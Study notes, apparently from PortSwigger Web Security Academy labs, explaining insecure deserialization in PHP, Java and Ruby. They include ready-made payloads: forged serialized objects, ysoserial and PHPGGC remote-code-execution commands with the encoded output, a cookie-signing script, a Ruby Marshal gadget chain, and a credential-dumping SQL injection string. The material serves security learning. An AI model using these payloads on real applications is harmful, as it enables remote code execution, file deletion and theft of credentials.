# Insecure Deserialization
## Serialization and deserialization
Serialization is the process of converting complex data structures such as objects into a "flatter" format that can be sent and received as a sequential stream of bytes.
Deserialization is a reverse process.  
## Insecure deserialization
Insecure deser appears when suer-controllable data is deserializaed by website.  
This enables attacker to manipulate serialized objects to pass harmful data into the application code.  
This buln is also called "onject injection"  
## Identifying
We need to inspect all requests to detect any data that is possibly serialized  
## PHP serialization format
`User` object:
```
$user->name = "carlos";
$user->isLoggedIn = true;
```
When serialized object may look like this:
```
O:4:"User":2:{s:4:"name":s:6:"carlos"; s:10:"isLoggedIn":b:1;}
```
Interpreting:
* O:4:"User" - An object with the 4-character class name "User" 
* 2 - the object has 2 attributes 
* s:4:"name" - The key of the first attribute is the 4-character string "name" 
* s:6:"carlos" - The value of the first attribute is the 6-character string "carlos" 
* s:10:"isLoggedIn" - The key of the second attribute is the 10-character string "isLoggedIn" 
* b:1 - The value of the second attribute is the boolean value true 
PHP uses `serialize()` and `unserialize()` methods. If we have source code, we need start looking for `unserialize()` method.  
## Java ser format
Some langs such as Java are using binary format for serialization. All serialized Java objects always begin with same bytes, which are encoded as `ac ed` in hex and `r00` in bas64.  
Any class that implements interface `java.io.Serializable` can be serd and deserd. If we have source code, note any code that uses `readObject()` method, which is used to read and deserialize data from an `InputStream` 

## Modifying object
If we detect serialized object, we are able to decode it and change object attributes, then re-encode it and replace original object (for example cookie)  

## Modifying data types
We can not only modify existing attributes, but also supply unexpected data types  
For example we can use PHP looce comparison operato `==` to exploit this lind of vuln.  
When 0 is compared to any string it equals true, because string doesn't contain any string so it equals to 0  
So, in such case:
```
$login = unserialize($_COOKIE)
if ($login['password'] == $password) {
// log in successfully
}
```
We can modify password attribute to 0, and it will always return `true`, when compared to string password.  

Example:
```
O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}
```
Here we changed `acccess token` to integer 0  

## Using application functionality
If app deletes, for example, user's photo during some process (e.g. user deletion) and this proces is deserialized, we can potentially modify the location of deleted file and delete something else  
```
O:4:"User":3:{s:8:"username";s:5:"gregg";s:12:"access_token";s:32:"oe27t7ht5ywq0wzxxscz5237579ymm6o";s:11:"avatar_link";s:23:"/home/carlos/morale.txt";}
```
## Magic methods
Some code uses magic methods to build objects. So possibly we can investigate code for such methods and try to create arbitrary object.  
Sometimes we could be able to access soruce code with appending `~` to file name to accesss backup file  
For example, we can detect smth like:
```
function __destruct() {
        // Carlos thought this would be a good idea
        if (file_exists($this->lock_file_path)) {
            unlink($this->lock_file_path);
        }
    }
``` 
We see a amgic method `__destruct()` inside calss CustomTemplate. So we can do such thing:
```
O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
```
This will create object of CustomTemplate class with lock_file_path which is used by `unlink()` function inside class and we delete arbitrary file.  

## Gadget chains
"gadget" is snipept of code which can help an attacker to achieve a goal.  
Attacker's goal could be to invoke a method from one gadget which will pass their input to another gadget.  
Detecting gadget chain is very hard process. SOmetimes we could be able to use pre-built gadget chains with next tools:
* ysoserial
* Java-Deserialization-Scanner extension  
## Java gadget chain
Java 16+ needs additional arguments to run ysoserial. To create ready exploit, encoded into base64, without spaces, we can use
```
java -jar --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED --add-opens=java.base/java.net=ALL-UNNAMED --add-opens=java.base/java.util=ALL-UNNAMED ysoserial-all.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64 -w0 | xclip -selection clipboard
```
## PHP gadget chain
For PHP we can use "PHP Generic Gadget Chains" (PHPGGC)  
Example:
```
Cookie: session=%7B%22token%22%3A%22Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJ6MHd5M3Q4N3N6dWRsaGplY2pxODFmdWg5NGEwbjd1MyI7fQ%3D%3D%22%2C%22sig_hmac_sha1%22%3A%2273b1afe16eb0c0daeda13531ed14139ae2284ee4%22%7D

decoded:
Cookie: session={"token":"Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJ6MHd5M3Q4N3N6dWRsaGplY2pxODFmdWg5NGEwbjd1MyI7fQ==","sig_hmac_sha1":"73b1afe16eb0c0daeda13531ed14139ae2284ee4"}

token decoded:
O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"z0wy3t87szudlhjecjq81fuh94a0n7u3";}
```
And we see that cookie is signed with sha1 hash  
When modifying cookie, we notice error message that exposes framework - `Symphony 4.3.6` and location of phpinfo file.  
In php_info we see exposed SECRET_KEY  
Next, we are creating exploit:
```
./phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64 | sed ':a;N;$!ba;s/\n/ /g;s/ //g' | xclip -selection clipboard
```
```
Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIiOjI6e3M6NTc6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBkZWZlcnJlZCI7YToxOntpOjA7TzozMzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQ2FjaGVJdGVtIjoyOntzOjExOiIAKgBwb29sSGFzaCI7aToxO3M6MTI6IgAqAGlubmVySXRlbSI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO319czo1MzoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcVGFnQXdhcmVBZGFwdGVyAHBvb2wiO086NDQ6IlN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcUHJveHlBZGFwdGVyIjoyOntzOjU0OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAcG9vbEhhc2giO2k6MTtzOjU4OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAc2V0SW5uZXJJdGVtIjtzOjQ6ImV4ZWMiO319Cg==

```
Next we need to construct valid cookie to run exploit. For this purpose we will use PHP script  
```
<?php
$object = "OBJECT-GENERATED-BY-PHPGGC";
$secretKey = "LEAKED-SECRET-KEY-FROM-PHPINFO.PHP";
$cookie = urlencode('{"token":"' . $object . '","sig_hmac_sha1":"' . hash_hmac('sha1', $object, $secretKey) . '"}');
echo $cookie;
```
And next we use script-generated cookie in our request  

## Ruby gadget chain
```
# Autoload the required classes
Gem::SpecFetcher
Gem::Installer

# prevent the payload from running when we Marshal.dump it
module Gem
  class Requirement
    def marshal_dump
      [@requirements]
    end
  end
end

wa1 = Net::WriteAdapter.new(Kernel, :system)

rs = Gem::RequestSet.allocate
rs.instance_variable_set('@sets', wa1)
rs.instance_variable_set('@git_set', "id")

wa2 = Net::WriteAdapter.new(rs, :resolve)

i = Gem::Package::TarReader::Entry.allocate
i.instance_variable_set('@read', 0)
i.instance_variable_set('@header', "aaa")


n = Net::BufferedIO.allocate
n.instance_variable_set('@io', i)
n.instance_variable_set('@debug_output', wa2)

t = Gem::Package::TarReader.allocate
t.instance_variable_set('@io', n)

r = Gem::Requirement.allocate
r.instance_variable_set('@requirements', t)

payload = Marshal.dump([Gem::SpecFetcher, Gem::Installer, r])
puts Base64.encode64(payload)
```
## Creating own exploit
The first step is to study this source code to identify a class that contains a magic method that is invoked during deserialization.  
```
import java.sql.SQLException;
import java.sql.Statement;

public class ProductTemplate implements Serializable
{
    static final long serialVersionUID = 1L;

    private final String id;
    private transient Product product;

    public ProductTemplate(String id)
    {
        this.id = id;
    }

    private void readObject(ObjectInputStream inputStream) throws IOException, ClassNotFoundException
    {
        inputStream.defaultReadObject();

        JdbcConnectionBuilder connectionBuilder = JdbcConnectionBuilder.from(
                "org.postgresql.Driver",
                "postgresql",
                "localhost",
                5432,
                "postgres",
                "postgres",
                "password"
        ).withAutoCommit();
        try
        {
            Connection connect = connectionBuilder.connect(30);
            String sql = String.format("SELECT * FROM products WHERE id = '%s' LIMIT 1", id);
            Statement statement = connect.createStatement();
            ResultSet resultSet = statement.executeQuery(sql);
            if (!resultSet.next())
            {
                return;
            }
            product = Product.from(resultSet);
        }
        catch (SQLException e)
        {
            throw new IOException(e);
        }
    }

    public String getId()
    {
        return id;
    }

    public Product getProduct()
    {
        return product;
    }
}

```
Here we can detect `ProductTemplate.readObject()` methods that passes `id` to a SQL statement.  

Then we write a script which instantiates a `ProductTemplate` with an arbitrary ID, serializes it, and then Base64-encodes it. [link](https://github.com/PortSwigger/serialization-examples/tree/master/java/solution)
Next we are creating `ProductTemplate` with `'` in `id`. And after it we are using our payload as cookie and detect sql injection.  
Compile with `javac Main.java`  
Then we execute it with `java Main` and use serialized object as our cookie and catch SQL error.  
Adding `UNION SELECT Nukll, null...` we detect 8 columns in table  
Finally, after detecting strings in columns, we are able t ocraft exploit:
```
' UNION ALL SELECT NULL,NULL,NULL,CAST((SELECT username||':'||password FROM users LIMIT 1 OFFSET 0) AS INT),NULL,NULL,NULL,NULL-- -
```

## Custom gadget chain exploit for PHP
We detect serialized cookie and file `/cgi-bin/libs/CustomTemplate.php` from page's source code  
We can detect it's backup by appending `~` to a filename  
We see a magic method:
```
public function __wakeup() {
        $this->build_product();
    }
```
So, when the PHP deserialize our session cookie, it’ll invoke method `build_product()`.
Method build_product() will then create a new object Product, by referring the default_desc_type and desc attribute from class CustomTemplate.  
Also, class DefaultMap has a magic method called __get(). It’ll be invoked when reading data from inaccessible (protected or private) or non-existing properties.  
This magic method will then invoke method call_user_func(), which will execute any function that is passed into it via the DefaultMap->callback attribute. The function will be executed on the $name, which is the non-existent attribute that was requested.  
PHP payload:
```
CustomTemplate->default_desc_type = "rm /home/carlos/morale.txt";
CustomTemplate->desc = DefaultMap;
DefaultMap->callback = system
```
* We can control class CustomTemplate’s attribute default_desc_type and desc, as magic method __wakeup() will be automatically invoked
* Then we set the CustomTemplate->desc attribute’s value to object DefaultMap. This will allow us to parse the CustomTemplate->desc attribute to Product->desc
* After that, the Product constructor will find DefaultMap->default_desc_type attribute
* Since object DefaultMap doesn’t have default_desc_type attribute, it’ll then invoke __get() magic method
* Finally, that magic method will invoke system from DefaultMap->callback on the default_desc_type, which is set to our shell command
serialized:
```
O:14:"CustomTemplate":2:{s:17:"default_desc_type";s:26:"rm /home/carlos/morale.txt";s:4:"desc";O:10:"DefaultMap":1:{s:8:"callback";s:6:"system";}}
```
encoding it with `| base64 -w0`
## PHAR deserialization
So far, we've looked primarily at exploiting deserialization vulnerabilities where the website explicitly deserializes user input. However, in PHP it is sometimes possible to exploit deserialization even if there is no obvious use of the `unserialize()` method.  
PHP provides several URL-style wrappers that you can use for handling different protocols when accessing file paths.  
`phar://` provides stream interface to access  php archive (.phar) files  
All .phat data is implicitly deserialized, so it could be vector for insecure deser attacks.  
For exploiting we need to use file upload functionality, for example polyglot `JPG-PHAR` image  
As long as the class of the object is supported by the website, both the `__wakeup()` and `__destruct()` magic methods can be invoked in this way, allowing you to potentially kick off a gadget chain using this technique.  
### Lab:
We see file upload in avatar block. If we are opening avatar image in new page we see `https://0a6800480421884281f94edc00930001.web-security-academy.net/cgi-bin/avatar.php?avatar=wiener`
Check `/cgi-bin/` dir and detect couple backups of php files.  
In CustomTemplate.php, there is a class called CustomTemplate.  
Also, there is a __destruct() magic method, which will be invoked when the PHP script is stopped or exited.  
When this method is invoked, it’ll delete a file from CustomTemplate->lockFilePath(), which is templates/$CustomTemplate->template_file_path.lock.  
Moreover, the isTemplateLocked() method is using file_exists() method on CustomTemplate->lockFilePath() attribute.  

In Blog.php, it uses Twig template engine, and there is a class called Blog.  
The __wakeup() magic method is interesting for us, as it’ll automatically invoked during the deserialization process.  
When the __wakeup() magic method is invoked, it’ll create a new object from Twig_Environment(), and it’s referring the Blog->desc attribute.  
Armed with above information, we can exploit SSTI (Server-Side Template Injection) and using PHAR stream to gain remote code execution!  
[More here](https://siunam321.github.io/ctf/portswigger-labs/Insecure-Deserialization/deserial-10/)

